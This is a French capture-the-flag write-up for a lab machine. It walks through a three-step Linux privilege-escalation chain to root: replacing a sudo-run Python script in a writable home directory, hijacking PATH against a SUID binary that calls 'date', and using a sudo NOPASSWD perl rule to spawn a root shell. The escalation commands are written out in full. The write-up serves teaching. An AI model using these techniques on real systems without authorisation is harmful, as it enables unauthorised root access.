Toss a Coin #2
> **Catégorie :** Privilege Escalation (chaîne complète → root)
> **Cible :** `10.10.0.2` (Debian 13 « trixie », suite de Toss a Coin #1)
> **Flag :** `/root/root.txt`
---
Objectif
Suite directe de Toss a Coin #1. On repart de l'accès `jaskier` et le but est
d'atteindre root en remontant une chaîne de trois utilisateurs :
jaskier → yen → geralt → root. Chaque saut exploite une mauvaise
configuration différente :
un répertoire home inscriptible combiné à une règle sudo ;
un binaire SUID qui appelle `system()` avec une commande non qualifiée
(PATH hijack) ;
une règle `sudo NOPASSWD` sur perl (GTFOBins).
C'est un excellent cas d'école des trois grandes familles de privesc Linux.
---
1. Accès initial — jaskier
```bash
ssh jaskier@10.10.0.2
# mot de passe récupéré dans Toss a Coin #1
```
→ `jaskier@the_continent:~$`
---
2. jaskier → yen — home inscriptible + règle sudo
Premier réflexe : vérifier les droits `sudo`.
```bash
sudo -l
```
Résultat :
```
User jaskier may run the following commands on the_continent:
    (yen) /usr/bin/python3 /home/jaskier/toss-a-coin.py
```
→ `jaskier` peut exécuter ce script précis en tant que `yen`.
La faille : les permissions du dossier, pas du fichier
Le script `toss-a-coin.py` appartient à root et n'est pas modifiable
directement. Mais le dossier qui le contient, `/home/jaskier`, appartient à
`jaskier` :
```
drwxr-xr-x jaskier jaskier /home/jaskier
```
> **Le point clé (permissions Unix) :** le droit d'**écriture sur un répertoire**
> autorise à **créer et supprimer** les fichiers qu'il contient — indépendamment
> du propriétaire de ces fichiers. On ne peut pas modifier le script, mais on peut
> le **supprimer** et le **recréer** avec notre propre contenu.
Exploitation
```bash
rm -f /home/jaskier/toss-a-coin.py

cat > /home/jaskier/toss-a-coin.py << 'EOF'
import os
os.system("/bin/bash")
EOF

sudo -u yen /usr/bin/python3 /home/jaskier/toss-a-coin.py
```
La règle sudo exécute maintenant notre script en tant que `yen`, qui ouvre un
shell.
→ shell en tant que yen.
---
3. yen → geralt — binaire SUID + PATH hijack sur `date`
L'énumération trouve un binaire SUID suspect :
```bash
ls -la /home/yen/portal
# -rwsr-sr-x 1 root root 16872 ... /home/yen/portal
```
> Le `s` dans `-rwsr-sr-x` indique les bits **SUID** et **SGID** : le binaire
> s'exécute avec les droits de root.
En le lançant :
```bash
./portal
```
```
I am preparing a portal for you Geralt.
It will be ready in about Sat, 19 Sep 2026 17:07:08 +0000
```
Analyse du binaire
On extrait ses chaînes pour comprendre ce qu'il fait en interne :
```bash
strings /home/yen/portal | grep -i -E "time|date|system|exec|sh$|bin/"
```
```
system
/bin/echo -n 'It will be ready in about ' && date --date='next hour' -R
```
Le problème : le binaire appelle `system()` avec une commande qui invoque
`date` sans chemin absolu. Comme `system()` lance `/bin/sh -c "..."`, le shell
résout `date` via la variable `$PATH`. Si on contrôle `$PATH`, on contrôle
quel « date » est exécuté.
> **PATH hijack :** quand un programme privilégié appelle une commande par son
> nom seul (`date` au lieu de `/usr/bin/date`), on peut placer en tête de `$PATH`
> un faux exécutable du même nom. Le programme exécutera **le nôtre**, avec ses
> privilèges élevés.
Exploitation
```bash
cd /tmp

cat > date << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x date

export PATH=/tmp:$PATH
/home/yen/portal
```
`export PATH=/tmp:$PATH` → met `/tmp` en premier, donc notre faux `date`
est trouvé avant le vrai.
`/bin/bash -p` → le `-p` préserve l'euid/egid élevé que bash abandonnerait
sinon (même logique que dans H4ck3rz #2).
→ shell en tant que geralt (`uid=1003(geralt) gid=1002(yen)`).
---
4. geralt → root — sudo NOPASSWD sur perl
À nouveau, on vérifie les droits sudo du nouvel utilisateur :
```bash
sudo -l
```
```
User geralt may run the following commands on the_continent:
    (root) NOPASSWD: /usr/bin/perl
```
→ `geralt` peut lancer `perl` en tant que root, sans mot de passe.
Exploitation (GTFOBins)
`perl` peut exécuter des commandes arbitraires via `exec`. C'est la technique
GTFOBins standard :
```bash
sudo -u root /usr/bin/perl -e 'exec "/bin/bash";'
```
`-e '...'` → exécute le code perl fourni.
`exec "/bin/bash"` → remplace le processus perl (déjà root) par un shell bash.
→ shell root.
```bash
id
cat /root/root.txt
```
---
Concepts clés à retenir
Concept	Explication
Répertoire inscriptible	Le droit d'écriture sur un dossier permet de supprimer/recréer ses fichiers, même ceux de root.
Cible d'une règle sudo	Si sudo lance un script qu'on peut remplacer, on contrôle ce qui s'exécute avec les droits cibles.
Bit SUID/SGID	`rws` → exécution avec les droits du propriétaire (souvent root).
PATH hijack	Une commande non qualifiée (`date`) dans un binaire privilégié → on l'usurpe via `$PATH`.
`bash -p`	Préserve les privilèges effectifs que bash droperait par défaut.
GTFOBins (perl)	Un binaire sudo légitime (`perl`) sait exécuter un shell → escalade directe.
---
Résumé de la chaîne d'attaque
Étape	De	Vers	Vulnérabilité
1	jaskier	yen	home inscriptible → remplacement d'un script root ciblé par une règle sudo
2	yen	geralt	binaire SUID root appelant `system()` avec `date` non qualifié → PATH hijack
3	geralt	root	règle `sudo NOPASSWD` sur `/usr/bin/perl` (GTFOBins)
```
ssh jaskier
   → sudo -l (script python en tant que yen, dossier inscriptible)
   → remplacement du script → shell yen
   → /home/yen/portal (SUID root, appelle date sans chemin)
   → faux date dans /tmp + PATH → shell geralt
   → sudo -l (NOPASSWD perl)
   → perl exec /bin/bash → root → root.txt
```